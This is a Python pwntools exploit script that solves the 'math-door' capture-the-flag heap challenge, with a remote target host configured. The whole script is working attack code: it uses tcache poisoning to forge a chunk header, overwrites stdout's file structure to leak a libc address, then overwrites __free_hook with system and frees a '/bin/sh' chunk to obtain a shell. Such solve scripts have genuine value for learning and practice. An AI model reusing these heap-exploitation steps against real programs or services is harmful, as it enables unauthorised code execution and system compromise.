#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './math-door'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'einstein-bd91179989a5c1ab.deploy.phreaks.fr', 443

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    # set sysroot /proc/{pid}/root
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=True)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/dreamdiary2"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='einstein')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
def alloc():
    io.sendlineafter(b": ", b"1")
    io.recvuntil(b'Hieroglyph created with index ')
    return int(io.recvuntil(b'.')[:-1])

def free(idx):
    io.sendlineafter(b": ", b"2")
    io.sendlineafter(b"Hieroglyph index:", str(idx).encode())

def edit(idx, data):
    io.sendlineafter(b": ", b"3")
    io.sendlineafter(b"Hieroglyph index:", str(idx).encode())
    io.sendafter(b"Value to add to hieroglyph:", data) #substract the curr with value

def tcache_poison(idx, offset_point, unsorted_offset):
    free(idx)
    free(idx+1)
    free(idx+2) #Victims point 
    free(idx+3)
    edit(2, p64(offset_point))
    edit(idx+2, p64(unsorted_offset)) # Making it points to the libc unsorted bins
    alloc()
    alloc()
    alloc()
    return alloc() #Get the address of stdout - 0x10

def exploit():
    # Mymaqn's solve script & write up hhttps://github.com/Mymaqn/HTBCA2023_Pwn_Writeups/tree/master/math_door
    global io
    io = initialize()
    with log.progress("Tcache poisoning to overwrite header chunk"), context.silent:
        alloc() #idx 0
        alloc() #idx 1
        alloc() #idx 2 (Victims)
        free(0)
        free(1)
        edit(1, p8(0x30))
        alloc() #idx 3
        alloc() #idx 4
        edit(4,p64(0x0)+p64(0x421))

    with log.progress("Get unsorted bins to be use for overwrite stdout flags"), context.silent:
        for i in range(0x421//0x21): #Fill for the unsorted bins
            alloc()
        alloc() #guard
        free(2) #Get unsorted bins
        stdout_min_10 = tcache_poison(7, 0xac0 - 0x10, unsigned(-0x80)) #Get the address of stdout - 0x10
        edit(stdout_min_10, b"\x00"*0x10 + p64(unsigned(-0x1087)))

    with log.progress("Get libc address with stdout + 0x10"), context.silent:
        stdout_plus_10 = tcache_poison(12, 0x20, unsigned(-0x120)) #Get the address of stdout + 0x10
        edit(stdout_plus_10, p64(0)*2 + p64(unsigned(-0x23)))
        io.recv(8)
        libc_leak = u64(io.recv(8))
        libc.address = libc_leak - libc.sym["_IO_2_1_stdin_"]
    log.info("Libc leak: %#x", libc_leak)
    log.info("Libc base: %#x", libc.address)

    with log.progress("Get shell with __free_hook"), context.silent:
        free_hook = tcache_poison(17, libc.sym["__free_hook"] - (libc.sym["_IO_2_1_stdout_"] + 0x10), unsigned(-0x1c0)) #Get free_hook
        edit(free_hook, p64(libc.sym["system"])) #Overwrite free_hook with system
        edit(21, b"/bin/sh\x00")
        free(21)
    io.interactive()

if __name__ == '__main__':
    exploit()
